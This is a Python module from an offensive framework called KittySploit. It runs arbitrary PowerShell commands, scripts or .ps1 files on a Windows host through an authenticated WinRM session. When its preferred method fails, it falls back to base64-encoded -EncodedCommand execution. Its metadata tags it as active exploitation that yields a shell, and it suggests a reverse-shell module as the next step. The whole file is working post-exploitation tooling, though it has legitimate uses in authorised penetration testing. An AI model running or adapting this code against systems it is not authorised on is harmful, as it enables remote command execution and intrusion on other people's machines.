#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import base64

from kittysploit import *
from lib.protocols.winrm.winrm_session_mixin import WinRMSessionMixin


class Module(Post, WinRMSessionMixin):
	__info__ = {
		"name": "WinRM PowerShell Exec",
		"description": "Execute a PowerShell command or script through an active WinRM session",
		"author": "KittySploit Team",
		"platform": Platform.WINDOWS,
		"session_type": SessionType.WINRM,
		"agent": {
			"risk": "intrusive",
			"effects": ["active_exploitation"],
			"expected_requests": 2,
			"reversible": False,
			"approval_required": True,
			"produces": ["risk_signals"],
			"chain": {
				"consumes_capabilities": ["authenticated_session"],
				"produces_capabilities": ["shell"],
				"suggested_followups": [
					"post/winrm/manage/upload_file",
					"post/winrm/manage/spawn_reverse_shell",
				],
			},
		},
	}

	command = OptString("", "PowerShell command to execute", False)
	script = OptString("", "Inline PowerShell script to execute", False)
	script_file = OptFile("", "Local .ps1 file to read and execute", False)
	use_execute_ps = OptBool(True, "Prefer pypsrp execute_ps when available", False)
	max_output_lines = OptInteger(200, "Maximum output lines to print", False)

	def _read_script_file(self) -> str:
		if not self.script_file:
			return ""
		if isinstance(self.script_file, list):
			return "".join(self.script_file)
		return str(self.script_file)

	def _get_payload(self) -> str:
		inline_script = str(self.script or "").strip()
		file_script = self._read_script_file().strip()
		command = str(self.command or "").strip()
		if inline_script:
			return inline_script
		if file_script:
			return file_script
		if command:
			return command
		raise ProcedureError(
			FailureType.ConfigurationError,
			"One of 'command', 'script', or 'script_file' must be set.",
		)

	def _print_output(self, text: str, label: str = "stdout") -> None:
		text = (text or "").strip()
		if not text:
			print_info(f"  ({label} empty)")
			return
		lines = text.splitlines()
		limit = int(self.max_output_lines or 200)
		for line in lines[:limit]:
			print_info(f"  {line}")
		extra = len(lines) - limit
		if extra > 0:
			print_info(f"  ... ({extra} more lines)")

	def run(self):
		try:
			payload = self._get_payload()
			print_status("Executing PowerShell payload over WinRM...")

			stdout = ""
			stderr = ""
			rc = 0

			if bool(self.use_execute_ps):
				try:
					stdout, stderr, rc = self.winrm_execute_ps(payload)
				except Exception as exc:
					print_warning(f"execute_ps failed ({exc}), falling back to EncodedCommand")
					encoded = base64.b64encode(payload.encode("utf-16-le")).decode("ascii")
					stdout = self.cmd_execute(
						f"powershell -NoProfile -NonInteractive -EncodedCommand {encoded}"
					) or ""
			else:
				encoded = base64.b64encode(payload.encode("utf-16-le")).decode("ascii")
				stdout = self.cmd_execute(
					f"powershell -NoProfile -NonInteractive -EncodedCommand {encoded}"
				) or ""

			if rc:
				print_warning(f"Remote PowerShell returned status {rc}")
			else:
				print_success("PowerShell execution completed")

			print_info("Output:")
			self._print_output(stdout, "stdout")
			if stderr and stderr.strip():
				print_info("Errors:")
				self._print_output(stderr, "stderr")
			return True
		except ProcedureError:
			raise
		except Exception as exc:
			raise ProcedureError(
				FailureType.Unknown, f"WinRM PowerShell exec error: {exc}"
			)
